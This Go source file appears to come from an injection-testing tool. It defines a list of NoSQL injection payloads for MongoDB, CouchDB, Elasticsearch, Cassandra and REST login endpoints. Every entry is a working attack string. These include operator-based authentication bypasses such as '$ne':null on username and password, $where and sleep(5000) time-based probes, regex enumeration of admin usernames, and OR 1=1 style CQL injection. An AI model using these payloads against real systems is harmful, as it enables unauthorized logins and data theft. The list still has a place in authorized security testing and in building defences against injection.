package payloads

var NoSQL = PayloadGroup{
	DBMS: "NoSQL",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// MongoDB JSON Injection
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "{\"$gt\":\"\"}"},
		{Type: "boolean", Content: "{\"$ne\":null}"},
		{Type: "boolean", Content: "{\"$gt\":\"\"}"},
		{Type: "boolean", Content: "{\"$regex\":\".*\"}"},
		{Type: "boolean", Content: "{\"$nin\":[]}"},
		{Type: "boolean", Content: "{\"$exists\":true}"},
		{Type: "boolean", Content: "{\"$type\":2}"},
		{Type: "boolean", Content: "{\"$where\":\"1==1\"}"},
		{Type: "boolean", Content: "{\"$where\":\"sleep(5000)\"}"},
		{Type: "boolean", Content: "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}"},
		{Type: "boolean", Content: "{\"$or\":[{\"username\":\"admin\"},{\"password\":{\"$ne\":null}}]}"},
		{Type: "boolean", Content: "{\"username\":{\"$regex\":\"^a\"}}"},
		{Type: "boolean", Content: "{\"username\":{\"$regex\":\"^admin\"}}"},
		{Type: "boolean", Content: "{\"$or\":[{\"1\":\"1\"}]}"},

		// ═══════════════════════════════════════════
		// REST API JSON Injection
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}"},
		{Type: "boolean", Content: "{\"username\":\"admin\",\"password\":\"' OR 1=1 --\"}"},
		{Type: "boolean", Content: "{\"email\":{\"$regex\":\".*@.*\"}}"},

		// ═══════════════════════════════════════════
		// CouchDB JavaScript Injection
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "admin' || '1'=='1"},
		{Type: "boolean", Content: "admin' || 1==1 //"},
		{Type: "boolean", Content: "admin' && '1'=='1"},
		{Type: "boolean", Content: "'; return true; //"},
		{Type: "boolean", Content: "\\\"} || 1==1 //"},
		{Type: "boolean", Content: "\\\"} || 1==1 && 'a'=='a"},
		{Type: "boolean", Content: "\\\"} || sleep(5000) //"},
		{Type: "boolean", Content: "'; return 1==1; //"},
		{Type: "boolean", Content: "';return true;//"},
		{Type: "boolean", Content: "1';return true;//"},
		{Type: "boolean", Content: "1';return 1;//"},
		{Type: "boolean", Content: "1' && sleep(5000) //"},

		// ═══════════════════════════════════════════
		// Elasticsearch Injection
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "{\"query\":{\"wildcard\":{\"*\":\"*\"}}}"},
		{Type: "boolean", Content: "{\"query\":{\"match_all\":{}}}"},

		// ═══════════════════════════════════════════
		// Apache Cassandra CQL Injection
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' OR 1=1--"},
		{Type: "boolean", Content: "' OR '1'='1"},
		{Type: "boolean", Content: "admin' OR '1'='1"},
		{Type: "boolean", Content: "' OR 1=1 ALLOW FILTERING--"},
		{Type: "boolean", Content: "' OR 1=1--"},
	},
}
